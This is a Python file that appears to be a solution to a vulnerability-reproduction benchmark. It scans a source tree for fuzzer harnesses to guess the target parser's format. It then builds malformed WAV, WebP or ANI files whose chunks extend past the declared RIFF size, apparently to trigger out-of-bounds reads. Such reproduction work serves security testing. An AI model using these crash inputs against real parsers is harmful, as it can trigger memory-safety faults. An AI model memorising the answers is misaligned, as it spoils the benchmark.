import os
import re
import struct
import tarfile
import zipfile
from typing import Dict, Iterable, List, Optional, Tuple


def _le16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _is_texty_path(p: str) -> bool:
    pl = p.lower()
    return pl.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".rs", ".go", ".java", ".py"))


def _safe_decode(b: bytes) -> str:
    return b.decode("latin1", errors="ignore")


def _iter_small_files_from_dir(root: str, max_file_size: int) -> Iterable[Tuple[str, bytes]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > max_file_size:
                continue
            rel = os.path.relpath(p, root)
            try:
                with open(p, "rb") as f:
                    yield rel, f.read()
            except OSError:
                continue


def _iter_small_files_from_tar(tar_path: str, max_file_size: int) -> Iterable[Tuple[str, bytes]]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf:
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > max_file_size:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                yield m.name, data
            except Exception:
                continue


def _iter_small_files_from_zip(zip_path: str, max_file_size: int) -> Iterable[Tuple[str, bytes]]:
    with zipfile.ZipFile(zip_path, "r") as zf:
        for zi in zf.infolist():
            if zi.is_dir():
                continue
            if zi.file_size <= 0 or zi.file_size > max_file_size:
                continue
            try:
                with zf.open(zi, "r") as f:
                    yield zi.filename, f.read()
            except Exception:
                continue


def _iter_small_files(src_path: str, max_file_size: int) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_small_files_from_dir(src_path, max_file_size)
        return
    lp = src_path.lower()
    if lp.endswith((".zip", ".jar")):
        yield from _iter_small_files_from_zip(src_path, max_file_size)
        return
    yield from _iter_small_files_from_tar(src_path, max_file_size)


def _wav_poc() -> bytes:
    fmt_data = (
        _le16(1) +          # PCM
        _le16(1) +          # channels
        _le32(8000) +       # sample rate
        _le32(8000) +       # byte rate
        _le16(1) +          # block align
        _le16(8)            # bits per sample
    )
    payload = (
        b"WAVE" +
        b"fmt " + _le32(16) + fmt_data +
        b"data" + _le32(4)
    )
    # RIFF size ends right after the "data" chunk header (no data in RIFF chunk).
    # Provide 4 bytes of trailing data beyond RIFF end.
    return b"RIFF" + _le32(len(payload)) + payload + b"ABCD"


def _webp_poc() -> bytes:
    # VP8X chunk should have size 10. Put the 10 bytes beyond RIFF end.
    payload = b"WEBP" + b"VP8X" + _le32(10)
    trailing = b"\x00" * 10
    return b"RIFF" + _le32(len(payload)) + payload + trailing


def _acon_poc() -> bytes:
    # .ani (RIFF ACON) with anih chunk (size 36) where anih data is beyond RIFF end.
    payload = b"ACON" + b"anih" + _le32(36)
    # 9 DWORDs = 36 bytes
    anih = struct.pack("<9I", 36, 1, 1, 1, 1, 32, 1, 10, 1)
    return b"RIFF" + _le32(len(payload)) + payload + anih


def _detect_format(src_path: str) -> str:
    max_file_size = 300_000
    max_total_read = 10_000_000
    max_files_read = 3000

    score: Dict[str, int] = {"WAVE": 0, "WEBP": 0, "ACON": 0}
    total_read = 0
    files_read = 0

    fuzzer_hits: List[str] = []
    generic_hits: List[str] = []

    def bump_from_text(t: str, weight: int) -> None:
        tl = t.lower()
        if "webp" in tl or "vp8x" in tl or "vp8l" in tl or "vp8 " in t:
            score["WEBP"] += 5 * weight
        if "wave" in tl or '"wave"' in tl or "fmt " in t or "riff/wave" in tl or ".wav" in tl or "wav" in tl:
            score["WAVE"] += 4 * weight
        if "acon" in tl or '"acon"' in tl or "anih" in tl or ".ani" in tl:
            score["ACON"] += 6 * weight

    def bump_from_path(p: str) -> None:
        pl = p.lower()
        if "webp" in pl:
            score["WEBP"] += 3
        if "wav" in pl or "wave" in pl or "sndfile" in pl:
            score["WAVE"] += 3
        if ".ani" in pl or "acon" in pl:
            score["ACON"] += 4

    try:
        for path, data in _iter_small_files(src_path, max_file_size):
            bump_from_path(path)
            total_read += len(data)
            files_read += 1
            if files_read > max_files_read or total_read > max_total_read:
                break

            if not _is_texty_path(path) and ("fuzz" not in path.lower()) and ("test" not in path.lower()):
                continue

            txt = _safe_decode(data)
            if "LLVMFuzzerTestOneInput" in txt or "fuzz_target!" in txt:
                fuzzer_hits.append(txt)
            elif "RIFF" in txt or "riff" in txt or "WEBP" in txt or "WAVE" in txt or "ACON" in txt or "anih" in txt:
                generic_hits.append(txt)

            if len(fuzzer_hits) >= 10 and (score["WEBP"] >= 40 or score["WAVE"] >= 40 or score["ACON"] >= 40):
                break
    except Exception:
        return "WAVE"

    for t in fuzzer_hits:
        bump_from_text(t, 6)
    for t in generic_hits:
        bump_from_text(t, 2)

    best = max(score.items(), key=lambda kv: kv[1])[0]
    if score[best] == 0:
        return "WAVE"
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format(src_path)
        if fmt == "ACON":
            return _acon_poc()
        if fmt == "WEBP":
            return _webp_poc()
        return _wav_poc()